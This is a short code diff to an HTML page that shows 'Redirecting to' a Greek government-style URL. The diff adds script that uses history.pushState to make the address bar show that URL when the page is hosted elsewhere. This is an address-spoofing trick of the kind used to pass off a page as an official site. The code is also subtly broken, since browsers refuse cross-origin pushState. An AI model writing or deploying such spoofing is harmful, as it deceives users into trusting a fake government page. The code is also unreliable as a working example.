@@ -36,10 +36,17 @@
   <p>Redirecting to http://www.gov.paso.gr/user?=234334...</p>
 
   <script>
-    // Simulate fake redirect (never leaves)
-    setTimeout(() => {
-      history.pushState(null, '', 'http://www.gov.paso.gr/user?=234334');
-    }, 1000);
+    // If the current hostname is not 'gov.paso.gr', push the fake URL
+    if (window.location.hostname !== 'www.gov.paso.gr') {
+      setTimeout(() => {
+        history.pushState(null, '', 'http://www.gov.paso.gr/user?=234334');
+      }, 1000);
+    }
+
+    // If someone refreshes while URL looks like gov.paso.gr, redirect to real file
+    if (window.location.hostname === 'www.gov.paso.gr') {
+      window.location.replace('index.html'); // fallback to actual page
+    }
   </script>
 </body>
 </html>
